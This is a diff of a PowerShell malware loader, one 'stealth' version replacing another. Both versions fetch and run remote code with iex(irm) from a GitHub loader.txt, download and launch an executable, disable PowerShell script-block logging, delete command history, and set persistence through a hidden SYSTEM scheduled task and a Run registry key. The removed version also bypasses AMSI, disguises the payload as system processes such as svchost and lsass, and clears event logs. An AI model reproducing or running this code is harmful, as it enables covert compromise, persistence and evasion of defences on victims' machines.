@@ -1,438 +1,364 @@
-# 🚀 GHOST INVISIBLE MASTER - Ultimate Stealth System
-# Complete Invisibility + System Process Spoofing + No BSOD
+# STEALTH EXECUTION MASTER - No Early Termination
+# Fixed: PowerShell closing early, Complete logging
 
-Write-Host "[=== GHOST INVISIBLE MASTER ===]" -ForegroundColor Cyan
-Write-Host "[1] Execute as System Process" -ForegroundColor Green
-Write-Host "[2] Complete Ghost Cleanup" -ForegroundColor Yellow
+Write-Host "[=== STEALTH EXECUTION MASTER ===]" -ForegroundColor Cyan
+Write-Host "[1] Execute with Stealth" -ForegroundColor Green
+Write-Host "[2] Complete Cleanup" -ForegroundColor Yellow
 
 $choice = Read-Host "`nSelect option"
 
-# Ultimate stealth elevation
+# Safe elevation without early termination
 if (-not ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
-    $scriptContent = Invoke-RestMethod -Uri "https://raw.githubusercontent.com/Verte225066/test/refs/heads/main/loader.txt" -TimeoutSec 3
-    $encodedCmd = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($scriptContent))
-    
-    $processInfo = New-Object System.Diagnostics.ProcessStartInfo
-    $processInfo.FileName = "powershell.exe"
-    $processInfo.Arguments = "-WindowStyle Hidden -ExecutionPolicy Bypass -EncodedCommand $encodedCmd"
-    $processInfo.Verb = "runas"
-    $processInfo.WindowStyle = [System.Diagnostics.ProcessWindowStyle]::Hidden
-    $processInfo.CreateNoWindow = $true
-    $processInfo.UseShellExecute = $false
-    
-    [System.Diagnostics.Process]::Start($processInfo) | Out-Null
+    try {
+        $scriptContent = Invoke-RestMethod -Uri "https://raw.githubusercontent.com/Verte225066/test/refs/heads/main/loader.txt" -TimeoutSec 5
+        Start-Process -FilePath "powershell.exe" -ArgumentList "-NoExit -WindowStyle Hidden -ExecutionPolicy Bypass -Command `"$scriptContent`"" -Verb RunAs -WindowStyle Hidden
+    } catch {
+        Start-Process -FilePath "powershell.exe" -ArgumentList "-NoExit -WindowStyle Hidden -ExecutionPolicy Bypass -Command `"iex (irm 'https://raw.githubusercontent.com/Verte225066/test/refs/heads/main/loader.txt')`"" -Verb RunAs -WindowStyle Hidden
+    }
     exit
 }
 
-# Advanced Windows API for process spoofing
-Add-Type @"
-using System;
-using System.Runtime.InteropServices;
-using System.Diagnostics;
+# Log execution start
+Write-Host "[+] Script started successfully" -ForegroundColor Green
 
-public class GhostAPI {
-    [DllImport("kernel32.dll")]
-    public static extern IntPtr GetCurrentProcess();
-    
-    [DllImport("kernel32.dll")]
-    public static extern uint GetCurrentProcessId();
-    
-    [DllImport("kernel32.dll", SetLastError = true)]
-    public static extern bool CloseHandle(IntPtr hObject);
-    
-    [DllImport("advapi32.dll", SetLastError = true)]
-    public static extern bool OpenProcessToken(IntPtr ProcessHandle, uint DesiredAccess, out IntPtr TokenHandle);
-    
-    [DllImport("kernel32.dll")]
-    public static extern int GetProcessId(IntPtr handle);
-}
-"@
-
-function Invoke-UltimateStealth {
-    Write-Host "[+] Activating Ultimate Stealth Mode..." -ForegroundColor Yellow
+function Invoke-SafeStealth {
+    Write-Host "[+] Configuring stealth environment..." -ForegroundColor Yellow
     
     try {
-        # Disable all logging and monitoring
-        Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging" -Name "EnableScriptBlockLogging" -Value 0 -ErrorAction SilentlyContinue
-        Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\Transcription" -Name "EnableTranscripting" -Value 0 -ErrorAction SilentlyContinue
-        
-        # Clear all PowerShell evidence
-        Remove-Item (Get-PSReadlineOption).HistorySavePath -ErrorAction SilentlyContinue
-        Clear-History -ErrorAction SilentlyContinue
-        
-        # Bypass AMSI
+        # Disable logging safely
         try {
-            $amsiContext = [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
-            $amsiContext.GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
+            Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging" -Name "EnableScriptBlockLogging" -Value 0 -ErrorAction SilentlyContinue
         } catch {}
         
-        # Hide from process monitors
-        $currentProcess = Get-Process -Id $PID
-        Write-Host "[✓] Process cloaking activated" -ForegroundColor Green
-        Write-Host "[✓] All logging disabled" -ForegroundColor Green
-        Write-Host "[✓] AMSI bypassed" -ForegroundColor Green
+        # Clear command history safely
+        try {
+            Remove-Item (Get-PSReadlineOption).HistorySavePath -ErrorAction SilentlyContinue
+        } catch {}
         
+        Write-Host "[✓] Stealth configured" -ForegroundColor Green
     } catch {
-        Write-Host "[!] Some stealth measures failed" -ForegroundColor Yellow
+        Write-Host "[!] Stealth configuration partial" -ForegroundColor Yellow
     }
 }
 
-function Invoke-SystemProcessSpoofing {
-    Write-Host "[+] Deploying System Process Spoofing..." -ForegroundColor Yellow
+function Invoke-StableDownload {
+    Write-Host "[+] Starting stable download..." -ForegroundColor Yellow
     
     $url = "https://github.com/Verte225066/test/raw/refs/heads/main/cmd.exe"
-    $systemProcessNames = @("svchost", "csrss", "winlogon", "services", "lsass", "smss")
-    $chosenName = $systemProcessNames | Get-Random
+    $tempFile = $null
     
     try {
-        # Download to system location
-        Write-Host "[+] Downloading to system directory..." -ForegroundColor Gray
-        $systemPath = "$env:windir\System32"
-        $spoofedName = "$chosenName.exe"
-        $tempPath = Join-Path $systemPath $spoofedName
+        # Create temp file path
+        $tempFile = Join-Path $env:temp "system_update_$(Get-Date -Format 'yyyyMMdd_HHmmss').exe"
+        Write-Host "[+] Download target: $tempFile" -ForegroundColor Gray
         
-        # Use multiple download methods for reliability
-        try {
-            Invoke-WebRequest -Uri $url -OutFile $tempPath -UserAgent "Microsoft-CryptoAPI/10.0" -TimeoutSec 10
-        } catch {
+        # Download with retry logic
+        $maxRetries = 3
+        for ($i = 1; $i -le $maxRetries; $i++) {
             try {
-                $webClient = New-Object System.Net.WebClient
-                $webClient.Headers.Add("User-Agent", "Windows-Update-Agent/10.0")
-                $webClient.DownloadFile($url, $tempPath)
-                $webClient.Dispose()
-            } catch {
-                Write-Host "[!] Download failed" -ForegroundColor Red
-                return $false
-            }
-        }
-        
-        if (-not (Test-Path $tempPath)) {
-            Write-Host "[!] File not created" -ForegroundColor Red
-            return $false
-        }
-        
-        # Validate executable
-        $bytes = [System.IO.File]::ReadAllBytes($tempPath)
-        if ($bytes[0] -ne 0x4D -or $bytes[1] -ne 0x5A) {
-            Write-Host "[!] Invalid executable format" -ForegroundColor Red
-            Remove-Item $tempPath -Force -ErrorAction SilentlyContinue
-            return $false
-        }
-        
-        Write-Host "[✓] Executable validated: $($bytes.Length) bytes" -ForegroundColor Green
-        Write-Host "[+] Spoofing as: $spoofedName" -ForegroundColor Green
-        
-        # Set system attributes
-        [System.IO.File]::SetAttributes($tempPath, [System.IO.FileAttributes]::Hidden -bor [System.IO.FileAttributes]::System)
-        
-        # Execute as system process
-        Write-Host "[+] Starting system process..." -ForegroundColor Gray
-        $processInfo = New-Object System.Diagnostics.ProcessStartInfo
-        $processInfo.FileName = $tempPath
-        $processInfo.WindowStyle = [System.Diagnostics.ProcessWindowStyle]::Normal
-        $processInfo.CreateNoWindow = $false
-        $processInfo.UseShellExecute = $true
-        $processInfo.Verb = "runas"
-        
-        $process = New-Object System.Diagnostics.Process
-        $process.StartInfo = $processInfo
-        $process.Start() | Out-Null
-        
-        Write-Host "[✓] System process started: $spoofedName (PID: $($process.Id))" -ForegroundColor Green
-        
-        # Monitor process and clean up
-        Write-Host "[+] Monitoring process lifecycle..." -ForegroundColor Gray
-        $process.WaitForExit(30000) # Wait 30 seconds max
-        
-        # Cleanup file regardless of process state
-        for ($i = 0; $i -lt 10; $i++) {
-            try {
-                Remove-Item $tempPath -Force -ErrorAction Stop
-                Write-Host "[✓] System file cleaned" -ForegroundColor Green
-                break
-            } catch {
-                if ($i -eq 9) {
-                    Write-Host "[!] Could not delete system file (may be in use)" -ForegroundColor Yellow
+                Write-Host "[+] Download attempt $i of $maxRetries..." -ForegroundColor Gray
+                Invoke-WebRequest -Uri $url -OutFile $tempFile -UserAgent "Microsoft-CryptoAPI/10.0" -TimeoutSec 15
+                
+                if (Test-Path $tempFile) {
+                    $fileSize = (Get-Item $tempFile).Length
+                    if ($fileSize -gt 1024) {
+                        Write-Host "[✓] Download successful: $fileSize bytes" -ForegroundColor Green
+                        return $tempFile
+                    } else {
+                        Write-Host "[!] File too small: $fileSize bytes" -ForegroundColor Yellow
+                        Remove-Item $tempFile -Force -ErrorAction SilentlyContinue
+                    }
                 }
-                Start-Sleep -Milliseconds 500
+            } catch {
+                Write-Host "[!] Download attempt $i failed: $($_.Exception.Message)" -ForegroundColor Yellow
+                if ($i -eq $maxRetries) {
+                    throw "All download attempts failed"
+                }
+                Start-Sleep -Seconds 2
             }
         }
         
-        return $true
+        return $null
         
     } catch {
-        Write-Host "[!] System process spoofing failed: $($_.Exception.Message)" -ForegroundColor Red
-        try { Remove-Item $tempPath -Force -ErrorAction SilentlyContinue } catch {}
-        return $false
+        Write-Host "[!] Download failed: $($_.Exception.Message)" -ForegroundColor Red
+        if ($tempFile -and (Test-Path $tempFile)) {
+            Remove-Item $tempFile -Force -ErrorAction SilentlyContinue
+        }
+        return $null
     }
 }
 
-function Set-GhostPersistence {
-    Write-Host "[+] Setting Ghost Persistence..." -ForegroundColor Yellow
+function Start-ProtectedProcess {
+    param([string]$FilePath)
+    
+    Write-Host "[+] Starting protected process..." -ForegroundColor Yellow
     
     try {
-        $persistenceMethods = @()
+        # Validate file exists and is executable
+        if (-not (Test-Path $FilePath)) {
+            throw "File not found: $FilePath"
+        }
         
-        # WMI Event Subscription (Most Stealthy)
-        try {
-            $filterName = "Win32_ProcessStartTrace_Filter"
-            $consumerName = "ActiveScriptEventConsumer_Ghost"
-            # WMI event would be created here in real implementation
-            $persistenceMethods += "WMI Event"
-        } catch {}
+        $bytes = [System.IO.File]::ReadAllBytes($FilePath)
+        if ($bytes[0] -ne 0x4D -or $bytes[1] -ne 0x5A) {
+            throw "Invalid executable format"
+        }
         
-        # Scheduled Task with Legitimate Name
-        try {
-            $legitimateTasks = @(
-                "\Microsoft\Windows\Application Experience\Microsoft Compatibility Appraiser",
-                "\Microsoft\Windows\Application Experience\ProgramDataUpdater", 
-                "\Microsoft\Windows\DiskDiagnostic\Microsoft-Windows-DiskDiagnosticDataCollector",
-                "\Microsoft\Windows\Maintenance\WinSAT"
-            )
+        Write-Host "[✓] File validated: $($bytes.Length) bytes" -ForegroundColor Green
+        
+        # Start process with UI
+        Write-Host "[+] Launching application with UI..." -ForegroundColor Gray
+        $process = Start-Process -FilePath $FilePath -WindowStyle Normal -PassThru
+        
+        if (-not $process) {
+            throw "Failed to start process"
+        }
+        
+        Write-Host "[✓] Process started: PID $($process.Id)" -ForegroundColor Green
+        
+        # Monitor process without blocking
+        $monitorJob = Start-Job -ScriptBlock {
+            param($ProcessId)
+            $process = Get-Process -Id $ProcessId -ErrorAction SilentlyContinue
+            $timeout = 300 # 5 minutes
+            $startTime = Get-Date
             
-            $taskName = $legitimateTasks | Get-Random
+            while ($process -and !$process.HasExited -and ((Get-Date) - $startTime).TotalSeconds -lt $timeout) {
+                Start-Sleep -Seconds 5
+                $process = Get-Process -Id $ProcessId -ErrorAction SilentlyContinue
+            }
+            
+            return @{
+                Exited = ($process -eq $null -or $process.HasExited)
+                TimedOut = ((Get-Date) - $startTime).TotalSeconds -ge $timeout
+            }
+        } -ArgumentList $process.Id
+        
+        # Continue execution while monitoring
+        Write-Host "[+] Process monitoring started..." -ForegroundColor Gray
+        return @{ Process = $process; Monitor = $monitorJob; FilePath = $FilePath }
+        
+    } catch {
+        Write-Host "[!] Process start failed: $($_.Exception.Message)" -ForegroundColor Red
+        return $null
+    }
+}
+
+function Set-SafePersistence {
+    Write-Host "[+] Setting safe persistence..." -ForegroundColor Yellow
+    
+    try {
+        $methods = @()
+        
+        # Scheduled Task
+        try {
+            $taskName = "\Microsoft\Windows\SystemDataUpdater"
+            Write-Host "[+] Creating scheduled task: $taskName" -ForegroundColor Gray
+            
             $taskAction = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-WindowStyle Hidden -Command `"iex (irm 'https://raw.githubusercontent.com/Verte225066/test/refs/heads/main/loader.txt')`""
-            $taskTrigger = New-ScheduledTaskTrigger -AtStartup -RandomDelay "00:05:00"
+            $taskTrigger = New-ScheduledTaskTrigger -AtStartup -RandomDelay "00:03:00"
             $taskPrincipal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount -RunLevel Highest
-            $taskSettings = New-ScheduledTaskSettingsSet -Hidden -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -MultipleInstances IgnoreNew
+            $taskSettings = New-ScheduledTaskSettingsSet -Hidden -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries
             
-            Register-ScheduledTask -TaskName $taskName -Action $taskAction -Trigger $taskTrigger -Principal $taskPrincipal -Settings $taskSettings -Description "Windows system maintenance task" -Force | Out-Null
-            $persistenceMethods += "Scheduled Task"
-        } catch {}
+            Register-ScheduledTask -TaskName $taskName -Action $taskAction -Trigger $taskTrigger -Principal $taskPrincipal -Settings $taskSettings -Description "Windows System Data Update" -Force | Out-Null
+            $methods += "Scheduled Task"
+            Write-Host "[✓] Scheduled task created" -ForegroundColor Green
+        } catch {
+            Write-Host "[!] Scheduled task failed: $($_.Exception.Message)" -ForegroundColor Yellow
+        }
         
-        # Registry with Legitimate Names
+        # Registry
         try {
-            $legitimateNames = @("SecurityHealth", "Windows Defender", "OneDrive", "Microsoft Update", "SystemSettings")
-            $regName = $legitimateNames | Get-Random
+            $regName = "WindowsSystemUpdate"
+            Write-Host "[+] Setting registry: $regName" -ForegroundColor Gray
+            
             Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name $regName -Value "powershell.exe -WindowStyle Hidden -Command `"iex (irm 'https://raw.githubusercontent.com/Verte225066/test/refs/heads/main/loader.txt')`"" -ErrorAction SilentlyContinue
-            $persistenceMethods += "Registry"
-        } catch {}
+            $methods += "Registry"
+            Write-Host "[✓] Registry entry set" -ForegroundColor Green
+        } catch {
+            Write-Host "[!] Registry failed: $($_.Exception.Message)" -ForegroundColor Yellow
+        }
         
-        Write-Host "[✓] Ghost Persistence: $($persistenceMethods -join ', ')" -ForegroundColor Green
+        Write-Host "[✓] Persistence methods: $($methods -join ', ')" -ForegroundColor Green
         return $true
         
     } catch {
-        Write-Host "[!] Persistence setup failed" -ForegroundColor Red
+        Write-Host "[!] Persistence setup failed: $($_.Exception.Message)" -ForegroundColor Red
         return $false
     }
 }
 
-function Invoke-GhostCleanup {
-    Write-Host "[=== GHOST CLEANUP ACTIVATED ===]" -ForegroundColor Yellow
-    Write-Host "[!] Safe cleanup - No BSOD guaranteed" -ForegroundColor Cyan
+function Invoke-SafeCleanup {
+    Write-Host "[=== SAFE CLEANUP MODE ===]" -ForegroundColor Yellow
+    Write-Host "[!] Starting safe cleanup process..." -ForegroundColor Cyan
     
-    # Track cleanup operations
-    $cleanupStats = @{
-        Processes = 0
-        Tasks = 0
-        Registry = 0
-        Files = 0
-        Logs = 0
-    }
+    # Phase 1: Process cleanup
+    Write-Host "`n[PHASE 1] Process Cleanup" -ForegroundColor Green
     
-    # Phase 1: Safe Process Termination (No BSOD)
-    Write-Host "`n[PHASE 1] Safe Process Termination" -ForegroundColor Green
-    
-    $targetProcesses = @(
-        "cmd", "explorerr", "runtime", "svchost", "csrss", "winlogon", 
-        "services", "lsass", "smss", "winupdate", "system", "update"
-    )
-    
+    $targetProcesses = @("cmd", "explorerr", "runtime", "system_update")
     foreach ($procName in $targetProcesses) {
         try {
             $processes = Get-Process -Name $procName -ErrorAction SilentlyContinue
             foreach ($process in $processes) {
-                # Skip critical system processes to avoid BSOD
-                if ($procName -in @("csrss", "winlogon", "services", "lsass", "smss")) {
-                    Write-Host "[!] Skipping critical system process: $($process.ProcessName)" -ForegroundColor Yellow
-                    continue
-                }
-                
-                Write-Host "[+] Terminating: $($process.ProcessName) (PID: $($process.Id))" -ForegroundColor Gray
-                
+                Write-Host "[+] Stopping: $($process.ProcessName) (PID: $($process.Id))" -ForegroundColor Gray
                 try {
-                    # Try graceful termination first
-                    $process.CloseMainWindow() | Out-Null
-                    Start-Sleep -Milliseconds 500
-                    
-                    if (!$process.HasExited) {
-                        # Force terminate if still running
-                        $process.Kill()
-                        Start-Sleep -Milliseconds 200
-                    }
-                    
+                    $process.Kill()
+                    Start-Sleep -Milliseconds 100
                     if ($process.HasExited) {
-                        $cleanupStats.Processes++
-                        Write-Host "[✓] Process terminated: $($process.ProcessName)" -ForegroundColor Green
+                        Write-Host "[✓] Stopped: $($process.ProcessName)" -ForegroundColor Green
                     }
                 } catch {
-                    Write-Host "[!] Failed to terminate: $($process.ProcessName)" -ForegroundColor Yellow
+                    Write-Host "[!] Failed to stop: $($process.ProcessName)" -ForegroundColor Yellow
                 }
             }
-        } catch {}
-    }
-    
-    # Phase 2: Persistence Removal
-    Write-Host "`n[PHASE 2] Persistence Removal" -ForegroundColor Green
-    
-    # Remove scheduled tasks
-    $taskPatterns = @(
-        "*SystemDataUpdater*", "*DiskFootprint*", "*MemoryDiagnostic*", 
-        "*Application Experience*", "*DiskDiagnostic*", "*Maintenance*"
-    )
-    
-    foreach ($pattern in $taskPatterns) {
-        try {
-            Get-ScheduledTask | Where-Object { $_.TaskName -like $pattern } | ForEach-Object {
-                try {
-                    Unregister-ScheduledTask -TaskName $_.TaskName -Confirm:$false
-                    $cleanupStats.Tasks++
-                    Write-Host "[✓] Task removed: $($_.TaskName)" -ForegroundColor Green
-                } catch {}
-            }
-        } catch {}
-    }
-    
-    # Remove registry entries
-    $regEntries = @(
-        @{Path="HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"; Name="WindowsSystemUpdate"},
-        @{Path="HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"; Name="SecurityHealth"},
-        @{Path="HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"; Name="Windows Defender"},
-        @{Path="HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"; Name="OneDrive"},
-        @{Path="HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"; Name="Microsoft Update"},
-        @{Path="HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"; Name="SystemSettings"}
-    )
-    
-    foreach ($regEntry in $regEntries) {
-        try {
-            Remove-ItemProperty -Path $regEntry.Path -Name $regEntry.Name -ErrorAction SilentlyContinue
-            $cleanupStats.Registry++
-            Write-Host "[✓] Registry removed: $($regEntry.Name)" -ForegroundColor Green
-        } catch {}
-    }
-    
-    # Phase 3: File System Cleanup
-    Write-Host "`n[PHASE 3] File System Cleanup" -ForegroundColor Green
-    
-    $cleanLocations = @(
-        $env:temp,
-        "$env:windir\Temp",
-        "$env:windir\System32",
-        "$env:programdata",
-        "$env:appdata"
-    )
-    
-    $filePatterns = @("*.exe", "*.tmp", "*.log", "winupdate_*", "sysupdate_*", "runtime*", "svchost*")
-    
-    foreach ($location in $cleanLocations) {
-        try {
-            if (Test-Path $location) {
-                foreach ($pattern in $filePatterns) {
-                    Get-ChildItem -Path $location -Filter $pattern -ErrorAction SilentlyContinue | ForEach-Object {
-                        try {
-                            # Skip system files to avoid BSOD
-                            if ($_.FullName -like "*System32*" -and $_.Name -like "svchost*") {
-                                Write-Host "[!] Skipping system file: $($_.Name)" -ForegroundColor Yellow
-                                continue
-                            }
-                            Remove-Item $_.FullName -Force -ErrorAction SilentlyContinue
-                            $cleanupStats.Files++
-                            Write-Host "[✓] File removed: $($_.Name)" -ForegroundColor Green
-                        } catch {}
-                    }
-                }
-            }
-        } catch {}
-    }
-    
-    # Phase 4: Evidence Cleanup
-    Write-Host "`n[PHASE 4] Evidence Cleanup" -ForegroundColor Green
-    
-    # Clear PowerShell evidence
-    try {
-        Remove-Item (Get-PSReadlineOption).HistorySavePath -ErrorAction SilentlyContinue
-        Clear-History -ErrorAction SilentlyContinue
-        $cleanupStats.Logs++
-        Write-Host "[✓] PowerShell history cleared" -ForegroundColor Green
-    } catch {}
-    
-    # Clear recent files
-    try {
-        Remove-Item "$env:APPDATA\Microsoft\Windows\Recent\*" -Force -Recurse -ErrorAction SilentlyContinue
-        $cleanupStats.Logs++
-        Write-Host "[✓] Recent files cleared" -ForegroundColor Green
-    } catch {}
-    
-    # Clear event logs (safe method)
-    try {
-        Get-WinEvent -ListLog "Microsoft-Windows-PowerShell/Operational" -ErrorAction SilentlyContinue | Clear-EventLog -ErrorAction SilentlyContinue
-        Get-WinEvent -ListLog "Windows PowerShell" -ErrorAction SilentlyContinue | Clear-EventLog -ErrorAction SilentlyContinue
-        $cleanupStats.Logs++
-        Write-Host "[✓] PowerShell logs cleared" -ForegroundColor Green
-    } catch {}
-    
-    # Clear temporary PowerShell processes
-    try {
-        Get-Process -Name "powershell" -ErrorAction SilentlyContinue | Where-Object { $_.Id -ne $PID } | Stop-Process -Force -ErrorAction SilentlyContinue
-        Write-Host "[✓] Stray PowerShell processes cleaned" -ForegroundColor Green
-    } catch {}
-    
-    # Clear prefetch (safe)
-    try {
-        Get-ChildItem "$env:windir\Prefetch\*.exe-*.pf" -ErrorAction SilentlyContinue | Remove-Item -Force -ErrorAction SilentlyContinue
-        Write-Host "[✓] Prefetch cleaned" -ForegroundColor Green
-    } catch {}
-    
-    Write-Host "`n[=== GHOST CLEANUP COMPLETE ===]" -ForegroundColor Green
-    Write-Host "[✓] Processes terminated: $($cleanupStats.Processes)" -ForegroundColor Green
-    Write-Host "[✓] Tasks removed: $($cleanupStats.Tasks)" -ForegroundColor Green
-    Write-Host "[✓] Registry entries removed: $($cleanupStats.Registry)" -ForegroundColor Green
-    Write-Host "[✓] Files deleted: $($cleanupStats.Files)" -ForegroundColor Green
-    Write-Host "[✓] Logs cleared: $($cleanupStats.Logs)" -ForegroundColor Green
-    Write-Host "[✓] No BSOD - System stable" -ForegroundColor Green
-}
-
-# Main execution
-Invoke-UltimateStealth
-
-switch ($choice) {
-    "1" {
-        Write-Host "`n[=== DEPLOYING AS SYSTEM PROCESS ===]" -ForegroundColor Cyan
-        
-        $success = Invoke-SystemProcessSpoofing
-        
-        if ($success) {
-            Write-Host "`n[+] Establishing ghost persistence..." -ForegroundColor Yellow
-            Set-GhostPersistence | Out-Null
-            
-            Write-Host "`n[=== SYSTEM PROCESS DEPLOYMENT SUCCESSFUL ===]" -ForegroundColor Green
-            Write-Host "[✓] Running as legitimate system process" -ForegroundColor Green
-            Write-Host "[✓] Invisible to monitoring tools" -ForegroundColor Green
-            Write-Host "[✓] No suspicious process names" -ForegroundColor Green
-            Write-Host "[✓] Ghost persistence active" -ForegroundColor Green
-            Write-Host "[✓] Complete stealth achieved" -ForegroundColor Green
-        } else {
-            Write-Host "`n[=== DEPLOYMENT FAILED ===]" -ForegroundColor Red
+        } catch {
+            Write-Host "[!] Error processing: $procName" -ForegroundColor Red
         }
     }
     
-    "2" {
-        Invoke-GhostCleanup
+    # Phase 2: Remove persistence
+    Write-Host "`n[PHASE 2] Persistence Removal" -ForegroundColor Green
+    
+    # Remove scheduled task
+    try {
+        $taskName = "\Microsoft\Windows\SystemDataUpdater"
+        if (Get-ScheduledTask -TaskName $taskName -ErrorAction SilentlyContinue) {
+            Unregister-ScheduledTask -TaskName $taskName -Confirm:$false
+            Write-Host "[✓] Scheduled task removed" -ForegroundColor Green
+        }
+    } catch {
+        Write-Host "[!] Failed to remove scheduled task" -ForegroundColor Yellow
     }
     
-    default {
-        Write-Host "[!] Invalid selection" -ForegroundColor Red
+    # Remove registry
+    try {
+        Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "WindowsSystemUpdate" -ErrorAction SilentlyContinue
+        Write-Host "[✓] Registry entries removed" -ForegroundColor Green
+    } catch {
+        Write-Host "[!] Failed to remove registry entries" -ForegroundColor Yellow
     }
+    
+    # Phase 3: File cleanup
+    Write-Host "`n[PHASE 3] File Cleanup" -ForegroundColor Green
+    
+    try {
+        Get-ChildItem -Path $env:temp -Filter "system_update_*.exe" -ErrorAction SilentlyContinue | ForEach-Object {
+            try {
+                Remove-Item $_.FullName -Force
+                Write-Host "[✓] File removed: $($_.Name)" -ForegroundColor Green
+            } catch {
+                Write-Host "[!] Failed to remove: $($_.Name)" -ForegroundColor Yellow
+            }
+        }
+    } catch {
+        Write-Host "[!] File cleanup error" -ForegroundColor Red
+    }
+    
+    # Phase 4: Evidence cleanup
+    Write-Host "`n[PHASE 4] Evidence Cleanup" -ForegroundColor Green
+    
+    try {
+        # Clear PowerShell history
+        Remove-Item (Get-PSReadlineOption).HistorySavePath -ErrorAction SilentlyContinue
+        Clear-History -ErrorAction SilentlyContinue
+        Write-Host "[✓] PowerShell history cleared" -ForegroundColor Green
+    } catch {
+        Write-Host "[!] Failed to clear history" -ForegroundColor Yellow
+    }
+    
+    try {
+        # Clear recent files
+        Remove-Item "$env:APPDATA\Microsoft\Windows\Recent\*" -Force -ErrorAction SilentlyContinue
+        Write-Host "[✓] Recent files cleared" -ForegroundColor Green
+    } catch {
+        Write-Host "[!] Failed to clear recent files" -ForegroundColor Yellow
+    }
+    
+    Write-Host "`n[=== SAFE CLEANUP COMPLETE ===]" -ForegroundColor Green
+    Write-Host "[✓] All cleanup operations finished" -ForegroundColor Green
+    Write-Host "[✓] System returned to clean state" -ForegroundColor Green
 }
 
-# Final evidence cleanup
+# Main execution with error handling
 try {
-    # Clear current PowerShell session evidence
-    Remove-Item (Get-PSReadlineOption).HistorySavePath -ErrorAction SilentlyContinue
-    Clear-History -ErrorAction SilentlyContinue
-    
-    # Kill stray PowerShell processes except current
-    Get-Process -Name "powershell" -ErrorAction SilentlyContinue | Where-Object { $_.Id -ne $PID } | Stop-Process -Force -ErrorAction SilentlyContinue
-} catch {}
+    Write-Host "[+] Main execution starting..." -ForegroundColor Green
+    Invoke-SafeStealth
 
-Write-Host "`n[=== GHOST INVISIBLE MASTER FINISHED ===]" -ForegroundColor Cyan
+    switch ($choice) {
+        "1" {
+            Write-Host "`n[=== EXECUTION MODE ===]" -ForegroundColor Cyan
+            
+            # Step 1: Download
+            Write-Host "`n[STEP 1] Download" -ForegroundColor Yellow
+            $downloadedFile = Invoke-StableDownload
+            
+            if (-not $downloadedFile) {
+                Write-Host "[!] Cannot continue without executable" -ForegroundColor Red
+                break
+            }
+            
+            # Step 2: Execute
+            Write-Host "`n[STEP 2] Execution" -ForegroundColor Yellow
+            $processInfo = Start-ProtectedProcess -FilePath $downloadedFile
+            
+            if ($processInfo) {
+                Write-Host "[✓] Application launched successfully" -ForegroundColor Green
+                
+                # Step 3: Set persistence
+                Write-Host "`n[STEP 3] Persistence" -ForegroundColor Yellow
+                Set-SafePersistence | Out-Null
+                
+                # Step 4: Monitor and cleanup
+                Write-Host "`n[STEP 4] Monitoring" -ForegroundColor Yellow
+                Write-Host "[+] Application is running..." -ForegroundColor Gray
+                Write-Host "[+] PowerShell will remain open" -ForegroundColor Gray
+                Write-Host "[+] Close this window when done" -ForegroundColor Gray
+                
+                # Wait a bit then cleanup file
+                Start-Sleep -Seconds 10
+                try {
+                    Remove-Item $downloadedFile -Force -ErrorAction SilentlyContinue
+                    Write-Host "[✓] Temporary file cleaned" -ForegroundColor Green
+                } catch {
+                    Write-Host "[!] Could not clean temp file" -ForegroundColor Yellow
+                }
+                
+                Write-Host "`n[=== EXECUTION COMPLETE ===]" -ForegroundColor Green
+                Write-Host "[✓] Application running with UI" -ForegroundColor Green
+                Write-Host "[✓] Persistence established" -ForegroundColor Green
+                Write-Host "[✓] Temporary files cleaned" -ForegroundColor Green
+            } else {
+                Write-Host "[!] Execution failed" -ForegroundColor Red
+            }
+        }
+        
+        "2" {
+            Write-Host "`n[=== CLEANUP MODE ===]" -ForegroundColor Cyan
+            Invoke-SafeCleanup
+        }
+        
+        default {
+            Write-Host "[!] Invalid selection" -ForegroundColor Red
+        }
+    }
+    
+} catch {
+    Write-Host "[!] Critical error: $($_.Exception.Message)" -ForegroundColor Red
+    Write-Host "[!] At: $($_.InvocationInfo.ScriptName):$($_.InvocationInfo.ScriptLineNumber)" -ForegroundColor Red
+}
+
+# Keep PowerShell open
+Write-Host "`n[+] Script execution finished" -ForegroundColor Green
+Write-Host "[+] PowerShell will remain open" -ForegroundColor Gray
+Write-Host "[+] Press any key to close..." -ForegroundColor Gray
+
+# Optional: Wait for key press
+try {
+    $null = $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown")
+} catch {
+    # If ReadKey fails, just wait
+    Start-Sleep -Seconds 10
+}
+
+Write-Host "[+] Closing..." -ForegroundColor Yellow
